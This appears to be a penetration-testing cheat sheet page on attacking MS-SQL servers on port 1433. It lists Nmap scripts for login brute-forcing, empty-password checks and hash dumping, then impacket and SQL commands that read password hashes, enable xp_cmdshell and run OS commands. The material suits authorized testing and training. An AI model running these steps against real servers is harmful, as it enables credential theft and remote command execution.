---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/penetration-testing/enumeration/service-ports/ms-sql-1433
---

# MS-SQL (1433)

## Nmap

```basic
#Running ms-sql-info Nmap script to discover MSSQL server information.
nmap --script ms-sql-info -p 1433 10.10.10.10

#Running ms-sql-ntlm-info script to disclose more information.
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 10.10.10.10

#Identifying valid MSSQL users and their passwords using provided username and password list.
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 10.10.10.10

# Running ms-sql-empty-password nmap script to check if sa user is enabled without any password.
nmap -p 1433 --script ms-sql-empty-password 10.10.10.10

#Dump the hashes of MSSQL users
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria 10.10.10.10

#Execute a command using xp_cmdshell using Nmap script
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" 10.10.10.10
```

## MSSQL Enumeration

```basic
#Connect to MSSQL Database
impacket-mssqlclient sa:123456qwerty@10.10.10.10

#checking the version
>select @@version;

#Discover the target machine hostname.
>select host_name();

#Determine users with sysadmin rights
>select loginname from syslogins where sysadmin = 1;

#Discover all the present databases
>select name from sys.databases

#Discover all MSSQL valid users.
>select * from sysusers;
 
#Discover all the MSSQL users hashe
>select name, password_hash FROM master.sys.sql_logins

# Identify that the xp_cmdshell is enabled or not
>SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';

#Enable xp_cmdshell
>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE

#Execute a command on the target machine.
>EXEC xp_cmdshell "whoami"
 
#Checking the current Path
>EXEC xp_cmdshell "echo %cd%

#Determine user with sysadmin right
>select loginname from syslogins where sysadmin = 1;
```
